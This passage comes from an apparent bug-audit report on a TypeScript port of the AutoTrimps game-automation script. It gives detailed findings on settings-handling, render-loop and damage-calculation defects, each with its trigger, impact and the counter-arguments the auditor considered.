  - Every portal it drives starts a PLAIN Size/Slow/Watch/Discipline/... run instead of a Challenge². Zero Challenge² bonus is earned; the user believes they are grinding C2s and are not. The run still starts normally, so there is no error, no console message, no visual tell except the missing C2 colouring.
  - Because `game.global.runningChallengeSquared` never becomes true from an AT portal, `main-loop.ts:318` never calls `c2runnerportal()`, so AT never abandons at the `C2 Runner Portal` zone to move to the next C2. The feature cannot even loop — it is a one-shot no-op.
  - Collateral: from the FIRST c2runner pick onward, AT's private flag sticks true for the whole session (nothing ever clears it; `portalClicked()` only clears the game's copy). `c2done` is then permanently false, which silently disables the `AutoStartDaily` block (portal.ts:281) AND the `else if (portalWindowOpen && challenge && c2done)` fallback that selects `HeliumHourChallenge` (portal.ts:304). Reproduced: portal #2 ends with `selectedChallenge: ''` — the next run starts with no challenge at all. So a user with C2 Runner + Auto Start Daily loses their dailies too, from an unrelated-looking setting.
  - Further inert paths that key off `runningChallengeSquared`: `finishChallengeSquared()` (main-loop.ts:261), `buynojobsc` (jobs.ts:150), `AutoGenC2` (magmite.ts:210-216), `cAutoGoldenUpgrades` (main-loop.ts:426), `cATGA2timer` (breedtimer.ts:148-150).

Severity of the loss is real: a Challenge² run's entire point is the C2 bonus, so an affected user's C2 grind produces nothing but wasted real time — and the feature silently regressed at the Phase-2 conversion (35a098af), so it has been dead ever since.

**Strongest counter-argument considered.** The strongest counter is REACHABILITY, not correctness — and it lands partially. `c2runnerstart` is `createSetting('c2runnerstart', ..., 'boolean', false, ...)` (settings-defs.ts:696-699), so it is default-OFF, and settings-visibility.ts:326-328 renders the whole trio only when `!radonon` (`getPageSetting('radonsettings') == 1` false), making it U1-only. It also needs `game.global.portalActive`. So zero users on defaults are affected, and the sim genuinely cannot see it: the only at-settings fixture (tests/fixtures/at-settings/p18-z2-balance-stall.json) has `"c2runnerstart":false`, and corpus.mjs:78's `11-portal-u1` — the one fixture that actually reaches doPortal() — sets only AutoPortal/HeHrDontPortalBefore/HeliumHrBuffer, leaving c2runnerstart at its false default. Worse for the net: the recorded oracle bundle (tests/fixtures/oracle/autotrimps.oracle.user.js:10853) carries the identical `var challengeSquaredMode;`, so even if a fixture did enable it, the differential would agree with itself.

Two weaker counters I tried and broke: (a) "esbuild renamed the definition, so the free reference still reaches the global" — refuted, the golden bundle shows the definition NOT renamed (`var challengeSquaredMode;` at :11894) and the writes bind to it; (b) "the values can't co-occur" — refuted, both `value` defaults ('999', '85') already satisfy their `> 0` gates, so only the one boolean must be flipped.

But none of this makes the finding unreal. It changes the impact tier from "everyone" to "everyone who turns the feature on", and for those users the feature is 100% inert plus it silently kills two unrelated portal paths.

---

### Dropdown values are never range-checked, so the shipped z550 preset's "Void 60" makes AT reset the player's NATIVE AutoGolden setting every tick

`src/modules/settings-engine.ts:271`

**Sim-visible?** No. Golden upgrades terminate in `buyGoldenUpgrade`, which is not in the wrapped-native set (buyJob/buyBuilding/buyUpgrade/buyEquipment/buyMap/selectMap/runMap/recycleMap/recycleBelow/setFormation/setGather), and the corpus fixtures carry their own settings rather than the 550 preset. baseline-zero cannot see either the missing purchases or the native-state clobber.

**Trigger.** Import/Export tab → "AUTOTRIMPS z550+ save string" (import-export.ts:205) → Import. That blob (utils.ts:54) carries "AutoGoldenUpgrades":"Void 60" and "dAutoGoldenUpgrades":"Void 60". The AutoGoldenUpgrades option list is ["Off","Helium","Battle","Void","Void + Battle"] (settings-defs.ts:2663) — "Void 60" is not in it. Fires whenever a golden upgrade is available (getAvailableGoldenUpgrades() > 0).

**Actual.** createSetting's dropdown arm stores `selected: loaded` verbatim and then does `btn.value = autoTrimpSettings[id].selected` with no membership check. Three consequences: (a) the <select> gets selectedIndex −1 and renders BLANK; (b) settings-visibility.ts:879–884 hides voidheliumbattle/radonbattle/battleradon and their daily twins because none of the four equality tests match; (c) worst — main-loop.ts:424 passes the guard `agu && agu != 'Off'`, so autoGoldenUpgradesAT("Void 60") runs (other.ts:122). Every `setting ==` arm misses, so `setting2` stays `undefined` and other.ts:136 calls `buyGoldenUpgrade(undefined)`. In the game (.trimps-game/main.js:14316-14321) `game.goldenUpgrades[undefined]` is undefined, so it takes the `if (!upgrade)` branch: `setAutoGoldenSetting(0); toggleAutoGolden(true); return;` — i.e. it writes `game.global.autoGolden = 0` (main.js:18086), silently clobbering the player's own native AutoGolden choice, every tick a golden upgrade is waiting, while buying nothing.

**Expected.** The same clamp that #81 added for multitoggles (clampMultitoggle, settings-engine.ts:78-84, called at line 300) applied to dropdowns: if the stored `selected` is not in `list`, fall back to the setting's declared `defaultValue` ('Off'). The frozen blobs are deliberately unedited (they are exact-string guarded), so the fix has to be at the createSetting chokepoint, exactly as #81's was.

**Impact.** **Opt-in, but 100% failure whenever the opt-in is taken. Not default-path.**

`AutoGoldenUpgrades` / `dAutoGoldenUpgrades` both default to `'Off'`, so a user who never imports the preset is unaffected — and the entire L0 corpus is in that state (all 12 fixtures at `"Off"`), which is why `baseline-zero` is green and structurally blind here.

Affected population: anyone who uses the shipped **Import/Export → "550+ AT Settings"** preset — a deliberately-offered, documented one-click-copy blob (`settings-defs.ts:2974`, `import-export.ts:205`) aimed at exactly the deep-endgame audience this fork serves. There is no visibility gate on the Export550 control. For every one of those users the outcome is deterministic, not probabilistic:

1. **AT's golden-upgrade automation is completely dead** in both normal runs and Dailies (`cAutoGoldenUpgrades` is `"Battle"` in the same blob, so C2 still works — only the two `"Void 60"` slots are dead). This is a real progression cost at z550+: goldens accumulate unbought indefinitely.
2. The `AutoGoldenUpgrades` and `Daily AutoGoldenUpgrades` dropdowns **render blank** (`selectedIndex = -1`), and the three related tuning controls are hidden, so there is no on-screen contradiction to notice.
3. If the player also has the game's native AutoGolden set to anything but Off, AT **silently resets it to Off** (`game.global.autoGolden = 0`) at 10 Hz for as long as a golden is pending — and since AT buys nothing, one is pending forever. Same tick also rewrites `#autoGoldenText.innerHTML` 10×/second.
4. The corruption is **persistent** — `saveSettings()` round-trips `"Void 60"` back to localStorage on every write, so it survives reloads and only clears if the user manually opens the blank dropdown and picks something.

Severity of the fix is low-risk and precedented: the same clamp-to-declared-default that #81 applied to multitoggles, at `settings-engine.ts:271`. The frozen blobs stay unedited.

**Strongest counter-argument considered.** **"Faithful to legacy — this is a frozen 2018 artifact, not a fork defect."** `"Void 60"` was a legal option label until `f7927b4c` (2018-12-10); upstream renamed the options and never touched the preset. The port copied both verbatim, and CLAUDE.md's byte-parity rule says the blobs are exact-string guarded and deliberately unedited. One could argue this is upstream's bug and out of scope.

This does not survive: #81 ruled on the identical class in the identical blob (`BetterAutoFight: 3` into a 0..2 multitoggle), and the resolution was explicitly *not* to edit the frozen blob but to clamp at the `createSetting` chokepoint — `clampMultitoggle`, `settings-engine.ts:78-84`. The comment there even generalizes the rationale ("any save written before an option was removed upstream smuggles the same corruption"). So the fork's own precedent says this is a defect it fixes, at the same line, in the same way.

Two narrower counters that do land partially, and that I'd hold the finding to:
- **The native-clobber consequence (c) is conditional.** If the player's `game.global.autoGolden` is already `0` — which is what AT's own #150 conflict badge advises — `setAutoGoldenSetting(0)` is a no-op. The clobber only bites players running native AutoGolden *and* AT's golden automation together. Consequences (a) blank control and (b) AT buys zero goldens are unconditional and are the real defect; (c) is a bonus, not the core.
- **It is visible, sort of.** The user does see an empty `<select>`. But an empty select next to a label reads as "nothing picked yet," and there is no other signal — the fallback-tuning controls are hidden rather than showing a contradiction, and nothing logs or throws.

I could not find any path that normalizes, migrates, clamps, or re-reads the value, and no fixture or net that would catch it.

---

### updateCustomButtons() zeroes `shouldFarm` from the GUI loop, killing the documented FarmWhenNomStacks7 carve-out

`src/modules/settings-visibility.ts:1052`

**Sim-visible?** No. `guiLoop` is dispatched by `setInterval`, which scripts/sim/boot.mjs:58 stubs to `() => 0`, so line 1052 never executes in the L0 net — the oracle records the un-clobbered behaviour. The one corpus AT-settings fixture (tests/fixtures/at-settings/p18-z2-balance-stall.json) also has `FarmWhenNomStacks7: false` and no Nom challenge, so even a working guiLoop could not reach the branch.

**Trigger.** U1, Nom challenge active, `FarmWhenNomStacks7` ON, `DisableFarm` at its shipped default -1 (or never set — `false <= 0` is true), and the cell-99 Improbability's `nomStacks` at 31..99.

**Actual.** `if (game.global.universe == 1 && getPageSetting('DisableFarm') <= 0) shouldFarm = false;` runs inside `updateCustomButtons()`, i.e. from `guiLoop` (main-loop.ts:596) once per second. maps.ts assigns `shouldFarm` only conditionally: line 385 fires solely when `DisableFarm > 0`, and the Nom carve-out at maps.ts:427 fires on `nomStacks == customVars.NomFarmStacksCutoff[1]`, i.e. EXACTLY 30 (maps.ts:21 = [7,30,100]). The next writer is `>= 100` (maps.ts:431/435). So for stacks 31..99 nothing re-asserts `shouldFarm`, and the render layer flips it to false within 1s of it being set. On the following tick maps.ts:410 (`shouldDoMaps = (!enoughDamage || shouldFarm || scryerStuck)`) and maps.ts:413 (`if (mapBonus >= MaxMapBonuslimit && !shouldFarm) shouldDoMaps = false`) both read the clobbered false, so AT leaves farming and stops running maps once map bonus caps. maps.ts:604's `shouldFarm = shouldFarm || false` is a no-op and does not perform this reset.

**Expected.** A render function must not mutate automation state. `shouldFarm` is owned by `autoMap()`; the `DisableFarm <= 0` reset belongs in maps.ts where the Nom carve-out can exempt itself — `FarmWhenNomStacks7`'s own description promises it forces Farming mode "even if Farming H:D is set to -1 (disabled)" and "forces Farming at 30 stacks (exiting once the ratio drops back under 10x)", which this line makes impossible.

**Impact.** Narrow and opt-in, but on the default value of the gating threshold. Requires ALL of: U1, Nom challenge active, `FarmWhenNomStacks7` ON (createSetting default is `'boolean', false` — settings-defs.ts:1279-1283, so opt-in), `DisableFarm <= 0` (the SHIPPED DEFAULT is -1, and an unset key coerces true as well), `MaxMapBonuslimit <= 10` (shipped default 10; at 11+ the `mapBonus >= limit` branch can never fire since the game caps mapBonus at 10, and the defect vanishes entirely), and gridArray[99].nomStacks in 31..99 with calcHDratio() > 10 at the moment stacks were exactly 30. Rendering is not a gate: settings-visibility.ts:476/478 turn both `DisableFarm` and `FarmWhenNomStacks7` ON whenever `radonsettings != 1`, i.e. they are visible for every U1 player. Consequence in that state: AT drops out of Farming mode within 1s and, with mapBonus at the cap, `shouldDoMaps` goes false, so AT stops sustaining map runs and feeds the Improbability until 100 stacks; the 100-stack carve-out (maps.ts:431) then suffers the same fate the moment AT is inside a map, producing a ~1 Hz enter/leave oscillation. Separately and independently of the Nom scenario's intent question, one autoMap() call in ten is internally inconsistent about shouldFarm, thrashing siphlvl (world-10 vs world-Siphonology.level, up to 7 map levels apart) and toggling the game's repeat-map setting once per second. Structurally unguarded: guiLoop never executes in the L0 proof net (setInterval stubbed in scripts/sim/boot.mjs), so `baseline-zero` is not evidence here; the only AT-settings fixture (tests/fixtures/at-settings/p18-z2-balance-stall.json) has FarmWhenNomStacks7 false and no Nom, and the deepest fixture is z62. Not a conversion regression — verbatim from legacy/SettingsGUI.js:1969.

**Strongest counter-argument considered.** The line is not a stray render-layer mutation — it is the deliberate counterpart of maps.ts:385. When `DisableFarm > 0`, line 385 re-asserts `shouldFarm` from the H:D ratio on every tick; when `DisableFarm <= 0` there is no per-tick writer at all, so the author needed a reset, and the botched sibling at maps.ts:604-605 (`if (getPageSetting('DisableFarm') <= 0) shouldFarm = shouldFarm || false;`) is direct evidence of that same intent expressed twice. Read that way, `shouldFarm === false` in the 31..99 window is the INTENDED steady state, and the tooltip supports it: it names exactly two trigger points ("forces Farming at 30 stacks ... and again at 100 stacks") and says the >7 band exists only to "get +200% dmg from MapBonus" — i.e. shouldDoMaps, not shouldFarm. Moving the reset into autoMap (the architecturally correct placement) would REPRODUCE today's clobbered behaviour deterministically, not restore farming; only the claim's proposed Nom-exempt version changes behaviour, and that is a strategy change with balance consequences, not a mechanism fix. Two further weakeners: the line is byte-identical to legacy/SettingsGUI.js:1969 (`git show 7a5cd96c^`) and legacy AutoTrimps2.js:94 already ran guiLoop at runInterval*10, so this is years-old upstream behaviour, not a conversion regression; and AT's calcEnemyHealth (calc.ts:686-747) does NOT model the game's Nom multiplier (`Math.pow(1.25, cell.nomStacks)`, main.js:12365), so in exactly the scenario the setting targets — stuck purely because of 1.25^30 = 808x healing — calcHDratio() may sit under NomfarmingCutoff (10) and the carve-out at maps.ts:428 would set shouldFarm = FALSE anyway, making the clobber a no-op. The defect therefore only bites when H:D happens to exceed 10 for unrelated reasons. What survives all of this is the self-inconsistent tick: no reading of intent justifies one autoMap() call reading shouldFarm as false at :413/:415 and writing it true at :428, with siphlvl and repeatClicked() thrashing at 1 Hz as a result.

---

## MEDIUM

### Max{Mansion,Hotel,Resort} mean opposite things to AT's two U1 housing buyers — the tooltip documents only one of them

`src/modules/buildings.ts:238`

**Sim-visible?** No. corpus.mjs seeds AT settings for only two fixtures (10-hypo-u2 and 11-portal-u1, neither touching any Max* id), so all 15 traces were recorded with the factory defaults MaxMansion/MaxHotel/MaxResort = '100'. The 0 / negative-but-not-(-1) values never occur in the corpus, so the divergent branch is never taken. Even if it were, baseline-zero pins what AT bought, not whether its two buyers agreed on what the number meant.

**Trigger.** Universe 1, `BuyBuildingsNew` = 1 or 2, and the user sets Max Mansions / Max Hotels / Max Resorts to 0 (or any negative other than -1) — the value their own tooltip documents as "removes the cap entirely".

**Actual.** buyFoodEfficientHousing (line 162) treats any value < 1 as UNCAPPED: `if (game.buildings[b].owned < getPageSetting('Max'+b) || getPageSetting('Max'+b) < 1) return true`. buyGemEfficientHousing (line 238) accepts only the exact sentinel -1: `if (game.buildings[k].owned < max || max == -1 || ...)`. Mansion, Hotel and Resort are in BOTH candidate lists (line 153 and line 210), so with Max = 0 the food buyer builds them without limit while the gem buyer refuses to ever pick them. The reverse reading is worse: a user who enters 0 meaning "build none of these" (the gem buyer's semantics, and what the repo's own frozen veteran blob does — utils.ts:54 stores MaxHouse/MaxMansion/MaxHotel/MaxResort/MaxGateway/MaxCollector all at 0 with MaxHut at 100) gets unlimited Mansions/Hotels/Resorts out of the food buyer.

**Expected.** One sentinel convention for a setting with one control. Either both readers accept `< 1` as uncapped, or both accept only `-1` — and the six tooltips should agree: MaxHut/MaxHouse/MaxMansion/MaxHotel/MaxResort say "0 or lower removes the cap entirely" (settings-defs.ts:747-768) while MaxGateway/MaxCollector say "-1 = no cap" (settings-defs.ts:769-781). The three overlapping ids are the ones where the prose is simply false for one of their two consumers.

**Impact.** **Default path for the code, opt-in for the value — and the tooltip is what makes the value tempting.**

- **Who runs the code:** every Universe 1 player on defaults. `BuyBuildingsNew` defaults to 1, so `buyBuildings()` → both housing buyers fire every tick. Nothing gates the divergence except the number in the box.
- **Who is bitten:** any U1 player who types 0, or any negative other than -1, into Max Mansions / Max Hotels / Max Resorts — i.e. anyone who takes the tooltip literally. Not hypothetical: the repo's own frozen veteran settings blob (`serializeSettings550()`, src/modules/utils.ts) has five of these ids at 0.
- **How badly:** the two buyers act on opposite readings of the same box. Reading it as the tooltip does ("uncapped"), the gem-efficiency buyer wrongly refuses Mansion/Hotel/Resort — and for the veteran blob's config, with MaxGateway=0 and MaxCollector=0 too, its whole candidate set collapses to Warpstation, silently disabling gem-efficient housing. Reading 0 as "build none" (the convention every neighbouring Max* setting uses), the food buyer instead builds them without limit, and they take ~62% of housing purchases. Either way the user gets the opposite of what one of the two automations was told. Not a crash — a silent, permanent, wrong-direction purchase policy.
- **Severity:** medium. Low frequency (needs a specific typed value), high consequence when hit (one of AT's two housing automations is fully inverted for the rest of the run), and zero feedback to the user.
- **Guarded by nothing:** sim-invisible (no fixture seeds Max*), and `baseline-zero` would only pin what AT bought, never whether its two buyers agreed on what the number meant.
- **Fix shape — read this before touching code:** the low-risk, zero-behaviour-change fix is correcting the three tooltips at settings-defs.ts:755-768 so MaxMansion/MaxHotel/MaxResort document the intersection both consumers honour (`-1` = no cap), matching their MaxGateway/MaxCollector neighbours and the entire U2 twin set. Unifying the *code* onto one sentinel is a purchase-behaviour change for existing users who already have a 0 stored — that is a user decision, and per the "fix the CONSUMER before the DEFAULT" rule it must not be done by flipping the default.

**Strongest counter-argument considered.** Two real objections, and neither kills it but the first reshapes the fix.

**(a) The code divergence is verbatim upstream, and the "0 = uncapped" feature may never have existed.** `git log -S` traces both predicates to **0855c122 "Update buildings.js" (Zeker0, 2022-10-13)**, where the legacy file already had `|| getPageSetting('Max'+b) < 1` in the food buyer and `|| max == -1` in the gem buyer. So this is not a port regression. More pointedly: `false < 1` is TRUE, so the food buyer's `< 1` works perfectly as sloppy *phantom-setting* handling — the exact job the gem buyer does explicitly with `if (max === false) max = -1` at line 237. Under that reading there was never a deliberate "0 removes the cap" sentinel at all; the food buyer just happened to swallow 0 along with `false`, and #107's tooltip **invented** a user-facing feature out of an implementation accident. That makes the safe fix a documentation correction, not a code change — and it means "which consumer is wrong" is genuinely a product question, since changing either one changes what AT buys for existing users whose localStorage already holds a 0.

**(b) It needs an out-of-band value.** Default is '100'; anyone who never opens the box is unaffected, and a user following the *other* half of the UI's own convention (the adjacent MaxGateway/MaxCollector/MaxGym/MaxTribute all say "-1 = no cap", and -1 is the value both consumers agree on) never trips it. The 400-purchase simulation above is an upper bound assuming all five unlocked and food as the sole binding resource, not a measured run.

What survives both: a single control cannot mean two things, and the shipped tooltip on three of these ids describes behaviour one of their two consumers does not implement. That is a checkable false claim about the code, authored in this repo, and it actively steers users toward the one value that triggers the split.

---

### getCritMulti's `high && A || B` precedence makes the Daily high-damage-shield branch fire when high is false

`src/modules/calc.ts:168`

**Sim-visible?** No. The 12-save corpus has no Daily challenge fixture, so this whole region is unguarded — neither baseline-zero nor any unit test evaluates the B disjunct.

**Trigger.** game.global.challengeActive === "Daily" AND getPageSetting('use3daily') == true AND textSettingIsSet('dhighdmg'). Then EVERY call to getCritMulti — including the four getCritMulti(false) calls at lines 378-380 and 866 — takes the swap branch.

**Actual.** `&&` binds tighter than `||`, so the condition parses as `(high && A) || B`. The B disjunct (line 171, the Daily/use3daily clause) is not guarded by `high` at all. Inside the branch, critChance/CritD are replaced by the globals critCC/critDD. highDamageShield() (line 150) only writes those globals when the currently-equipped shield's name matches the setting, so while the farming shield is equipped they hold their module-init values of 1 (lines 22-23) or a stale value from the last time the daily shield was worn. getCritMulti(false) then returns getMegaCritDamageMult(1) * 1 = 1 instead of the real crit multiplier.

**Expected.** Symmetry with the A disjunct — and with the `high` parameter's only reason to exist — says the intent is `high && (A || B)`. Both clauses describe "the user has configured a separate high-damage shield", and the caller asks for the high variant via `high`. Parenthesise the disjunction.

**Impact.** **Opt-in, U1-Daily-only, corpus-invisible — but severe for the users who turn it on.**

Default path: fully inert. `use3daily` defaults `false` (settings-defs.ts:263) and `dhighdmg` defaults `''` (settings-defs.ts:480), and `game.global.challengeActive` must be `"Daily"`. Zero default-path users affected. Note the shipped preset `serializeSettings550` (utils.ts:54) carries `"use3daily":true` but no `dhighdmg` key, so `createSetting`'s `''` default applies and `textSettingIsSet` is false — the preset alone does not arm it.

Affected population: a U1 player who turns on "Daily Windstacking" AND types a heirloom name into "DHS: High Damage" — i.e. the intended users of a documented, fully-built feature with its own settings block, made configurable again by #68.

For them, during every Daily, while the `dhighdmg` shield is not the equipped one, **every** `calcOurDmg` return is wrong by `cachedHighCritMulti / currentShieldCritMulti` — 18.6× too high once the daily shield has been worn, or exactly `1` (42× too low in my model) before it ever has. That feeds `enoughDamageE` (armor/weapon buys), `oneShotPower` and `calcCurrentStance` (formation choice, including the windstack stance decision the feature exists to make), and the map-farm decisions in `maps.ts`. `calcHDratio` alone is immune by accidental cancellation.

Sim visibility: none. No Daily fixture in the 12-save corpus, and both gating settings are off by default, so `baseline-zero` is not evidence about this region — it cannot reach it.

Severity: MEDIUM-HIGH for the opt-in cohort, ZERO for everyone else. Fix is one pair of parentheses: `high && (A || B)`. Note this is an inherited upstream defect (present verbatim in pre-conversion `legacy/modules/calc.js`), so it should be filed as a behaviour fix, not a conversion regression — and the fix changes numbers on the Daily path, so it wants a user-visible note even though it is a mechanism repair, not a tuning change.

**Strongest counter-argument considered.** Two real ones.

**(a) The finder's own evidence is wrong, which is usually fatal.** The claim's headline harm — "calcHDratio's divide/multiply pair cancels and the heirloom-swap correction collapses to just `*= trimpAA`" — is arithmetically false, and I proved it false (identical numerators under both parses, both cache states). A reviewer who checked only the cited consequence would REFUTE this. It survives only because the mechanism is independently real and I found uncompensated consumers the finder never named. The finder also miscited `calcCurrentStance:913-916`, which contains no `getCritMulti(false)` at all.

**(b) "AT deliberately evaluates Daily damage as if the high shield were on."** This is a coherent story: during Daily windstacking the low shield is worn to *withhold* damage, so you could argue AT should keep making farm/gear decisions against its real (high-shield) damage rather than the deliberately-nerfed number. That reading makes the code correct as written. I reject it on the three grounds in point 8 above — decisively on (c), since a cold cache returns `getMegaCritDamageMult(1) * 1 = 1`, i.e. AT would be evaluating a deep-Daily player as having *no crit multiplier whatsoever* until the daily shield is worn once per page load. No intent produces that.

A weaker third: the proof net's `buyEquipment`/`setFormation` differential would catch a gross break. It cannot here — the 12-save corpus has no Daily fixture, and even one would leave this inert because both gating settings ship off/empty.

---

### RcalcBadGuyDmg double-counts Pandemonium.getEnemyMult() — getBossMult() already contains it

`src/modules/calc.ts:1504`

**Sim-visible?** No. No fixture runs Pandemonium (it needs z149+ cleared; deepest fixture is z62), so this branch is never executed by the proof net — effectively unguarded.

**Trigger.** U2, game.global.challengeActive === "Pandemonium", with game.global.pandCompletions >= 1 (Pandemonium unlocks at getHighestLevelCleared >= 149, config.js:5674).

**Actual.** Lines 1503-1506 apply `number *= getEnemyMult()` and then `number *= getBossMult()`. But config.js:5678-5681 defines `getBossMult: function(){ return (1 + (this.pandemonium * 10)) * this.getEnemyMult(); }` — getEnemyMult is already a factor of getBossMult. AT therefore squares it: 5^(2*pandCompletions) instead of 5^pandCompletions.

**Expected.** Apply getBossMult() alone (which is what the health twin at line 1612 already does, and what the game does at config.js:5744 `cell.maxHealth = cell.preMayhemHealth * this.getBossMult()`). The Mayhem block immediately above (lines 1499-1502) is correct as written, because Mayhem's getBossMult (config.js:5068-5071, `1 + 0.1*stacks`) does NOT fold in getEnemyMult — which is exactly why the same two-line pattern is right there and wrong here.

**Impact.** DEFAULT PATH within its region, but the region is deep-U2 only — and completely unguarded. No setting gates the defect: calc.ts:1503 fires on `challengeActive === "Pandemonium"` alone. Trigger needs (a) Universe 2 (Pandemonium is `blockU1: true`), (b) `getHighestLevelCleared(true) >= 149` to unlock it (config.js filter), and (c) `pandCompletions >= 1` — i.e. Pandemonium runs #2 through #25. The first run is exactly correct (5^0 = 1), so this only bites players who repeat the challenge, which the challenge is explicitly designed for (maxRuns 25, reward scales with completions). Error is 5^pandCompletions: 5× on run 2, 25× on run 3, 2.98e17× on run 25 — and 5^(2·comps) (625× at comps=2) through `RpandaExtra` because of the second double-count at mapfunctions.ts:760. Blast radius inside that region is wide: the health-equipment satisficing predicate (equipment.ts:870), the gamma-burst damage estimate (calc.ts:1283/1288), `RequipExtra` map sizing (mapfunctions.ts:1428) and `RpandaExtra` map sizing all consume it, and all four fail in the same direction — AT believes enemies hit 5^n times harder than they do, so it retreats to farm and never advances. SIM-INVISIBLE, confirmed: the deepest corpus fixture is `12-warp-u1` at world 62 in Universe 1 (scripts/sim/corpus.mjs:85), and Pandemonium is U2-only at z149+, so no trace can reach the branch. The one existing unit test that names it, tests/calc.characterization.test.ts:509, stubs `getEnemyMult: () => 1, getBossMult: () => 1` — structurally incapable of catching a double-count.

**Strongest counter-argument considered.** Two, and I tested both. (A) "It is a deliberate worst-case cushion." AT applies `getBossMult()` unconditionally, even for map enemies where the game uses `getPandMult()` — so AT already models every enemy as the zone boss, and one could read the extra `getEnemyMult()` as more of the same conservatism. This fails on three counts: the health twin at calc.ts:1612 applies `getBossMult()` alone under the identical worst-case model, so the two twins would have to disagree about the same cushion; `RpandaExtra` explicitly divides by `boss` (mapfunctions.ts:761/768) precisely to strip the boss model back off, which is only coherent if `RcalcBadGuyDmg` returns exactly one clean boss multiplier; and 5^25 = 2.98e17 is not a cushion — it is a factor that makes every survival predicate false forever. (B) "Faithful to legacy." True — the line arrived unchanged in the first conversion commit, so this is a pre-existing upstream AutoTrimps bug rather than something the TypeScript port introduced. That changes who to blame, not whether the math is wrong: `getBossMult` demonstrably contains `getEnemyMult` in the pinned clone, and the game applies exactly one of them. I also checked whether the pinned clone might differ from what the claim quoted — it does not; I read config.js:5676-5688 and main.js:12383/11583-11586 directly out of `.trimps-game` at pin b9edb1d (gameClone 5.10.1, matching tests/fixtures/traces/manifest.json).

---

### estimateEquipsForZone's cost total uses the level-0 base price, understating the metal target by 1.2^level (and mixes Shield wood into a metal figure)

`src/modules/equipment.ts:981`

**Sim-visible?** NO. `Requipfarmon` defaults false and the three companion settings default to the string '-1', so `Requipfarm` (maps.ts:1288) is false on all 12 trace fixtures; no fixture seeds these settings (scripts/sim/corpus.mjs only seeds RAutoMaps/Requipon/Rhypoon/Rhypofarmstack for 10-hypo-u2). The whole region is unguarded.

**Trigger.** `Requipfarmon` on and `Requipfarmzone`/`RequipfarmHD`/`Requipfarmmult` all > 0 (maps.ts:1288), then `estimateEquipsForZone()[0]` is compared against `game.resources.metal.owned` at maps.ts:1292-1294 to decide `Rshouldequipfarm`. Bites hardest at high gear levels — U2's `Requipcaphealth`/`Requipcapattack` default to 50.

**Actual.** `getTotalMultiCost(equipCost[0], bonusLevels[equip], equipCost[1], true)` is fed `equipCost[0]`, the price of the FIRST level (level 0) at the current prestige. The game charges `cost[0] * Math.pow(cost[1], toBuy.level) * ((cost[1]^amt - 1)/(cost[1]-1))` (.trimps-game/main.js:4824, `compare = 'level'` for equipment), so the whole `1.2^currentLevel` factor is missing. Second defect on the same line: the loop adds Shield's cost too, and `RequipmentList.Shield.Resource === 'wood'`, so wood is summed into a total that maps.ts compares against metal only.

**Expected.** Multiply by `Math.pow(equipCost[1], game.equipment[equip].level)` — the same factor this file's own `mostEfficientEquipment` correctly applies one screen earlier at :716 (`Math.pow(cost[1], game.equipment[i].level + fakeLevels[i])`) — and keep the wood total separate from the metal total.

**Impact.** OPT-IN, U2-ONLY, DEFAULT-INERT — but the feature it gates is effectively non-functional when switched on.

Blast radius: zero for the default path. `Requipfarmon` defaults false (settings-defs.ts:1160) AND `Requipfarmzone`/`RequipfarmHD`/`Requipfarmmult` all default to the string `'-1'`, which fails maps.ts:1288's `> 0` test, so a user must deliberately turn on the boolean and set three numeric values. The controls only render under `radonon` (`radonsettings == 1`), so U1 players cannot reach it at all. No trace fixture seeds any of the four settings, so the entire region — both callers of `estimateEquipsForZone` — is invisible to the L0 proof net; `baseline-zero` is green here because it cannot see the code, not because the code is right.

Severity for the users who DO turn it on (U2 deep-push players, the exact audience the tooltip names): high. `Rshouldequipfarm` is the arming flag for the whole AutoEquip Farm subsystem — it feeds map selection (mapfunctions.ts:1418 `RequipExtra`, :1507, :1529, :1817, :1868) and the status readout (maps.ts:917). Because `metalneeded` is understated by `1.2^level` — 6.2× at level 10, 237× at 30, 9,100× at the default level-50 cap — the flag arms only in states 1.2^level poorer than intended. The user sees a setting they enabled and configured that silently does nothing except in a brief window right after each mass prestige (where level is near 0). Same failure shape as #153's `waitTill60`: a hardcoded/derived quantity that froze a whole subsystem with no red gate.

The wood-mixing half is lower severity but the same line: it inflates the figure and makes the comparison mixed-unit, so even the post-prestige window where the level factor is exact compares wood+metal against metal.

Fix shape (mechanism, not balance — no game constant changes): pass `equipCost[0] * Math.pow(equipCost[1], game.equipment[equip].level)` as the base, matching this file's own idiom at :716 and the game's `getBuildingItemPrice`; and accumulate wood and metal into separate totals so maps.ts:1292 compares metal against metal. Both are corrections toward the game's own formula, so trap 7 (sacrosanct balance numbers) does not apply — this is drift from the game, not a tuning change.

**Strongest counter-argument considered.** The strongest genuine counter-argument is provenance plus the level-0 escape hatch, and neither survives.

(a) "Faithful to legacy, therefore intended." The line is byte-identical to Zeker0's 2020 `modules/equipment.js:1130`, and this repo's convention is to filter faithful-to-legacy-intended from genuine defects. But nothing in the legacy file, the comments, or the tooltip states an intent to under-estimate; the fork's own tooltip claims the opposite; and the SAME function's helper at :716 applies `Math.pow(cost[1], level + fakeLevels[i])` correctly one screen earlier. A conservative "lower bound" reading also fails on direction: a lower bound on the metal target makes the farm arm LESS, which is the opposite of a safe default for a farming trigger. This is an omission, not a design.

(b) "The value cannot occur — level is always ~0 because AT prestiges constantly." This is the one that could have killed it, and it is the reason I refuse to say "never fires". `prestigeEquipment` does reset `level = 0`, so right after a prestige the formula is exact. But `levelEquipment(what, 1)` immediately follows (main.js:5917) so level ≥ 1, `Requip2` (default TRUE) forces every slot to level 2 at once (1.44×), and `RautoEquip` then climbs to the `Requipcap*` cap of 50 (9100×). The bug's magnitude is `1.2^level`, monotonically increasing across the whole inter-prestige interval, and the interval is exactly where deep-push players sit. So it degrades the trigger for essentially the whole run rather than not occurring.

(c) "The sim would have caught it." Refuted directly: no corpus fixture seeds `Requipfarmon`, the deepest fixture is z62, and the only two callers are both behind that gate. `baseline-zero` is green here because it cannot see the code, exactly the failure mode CLAUDE.md warns about.

(d) "Maybe `cost[0]` is kept current by something in AT." Refuted by reading the clone: `levelEquipment` touches only `level`; the only writer of `cost[0]` is `prestigeEquipment`, which simultaneously zeroes `level`.

(e) On the wood defect specifically: one could argue Shield is unreachable because `blockNow` makes it a block piece. Refuted — `blockNow` is set only by the Shieldblock upgrade (config.js:12424, default-off per `BuyShieldblock`), AT reads `RequipmentList.Shield.Stat === 'health'` unconditionally, and `healthCalculated` is always defined, so Shield is always a live `bestArmor` candidate in this function regardless.

---

### `Requipzone` default -1 makes `zoneGo` unconditionally true, killing REquipDamageCutoff and Requippercent; its tooltip also claims it gates prestiges, which it never does

`src/modules/equipment.ts:820`

